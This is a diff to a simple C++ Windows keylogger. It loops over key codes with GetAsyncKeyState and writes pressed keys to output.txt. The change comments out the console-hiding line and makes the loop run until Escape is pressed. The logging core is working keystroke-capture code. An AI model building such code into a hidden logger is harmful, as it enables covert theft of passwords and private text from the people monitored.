@@ -11,23 +11,26 @@ int main()
     string outfile = "output.txt";
     ofstream output;
     output.open(outfile);
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
-    HWND handle = GetActiveWindow();
+    //ShowWindow(GetConsoleWindow(), SW_HIDE);
+    //HWND handle = GetActiveWindow();
 
     char KEY = 'x';
-    int i = 0;
-	while (i<5) {
+    bool ongoing = true;
+	while (ongoing) {
 		for (int KEY = 8; KEY <= 190; KEY++)
-		{
+		{   
 			if (GetAsyncKeyState(KEY) == -32767) {
                 output << char(KEY);
-                i++;
+                //stop on
+                if(KEY == 27){
+                    cout << "HERE!" << endl;
+                    ongoing = false;
+                    }
 				}
 			}
 		}
         output.close();
         cout << "DONE!" << endl;
-        return 0;
 }
 
 
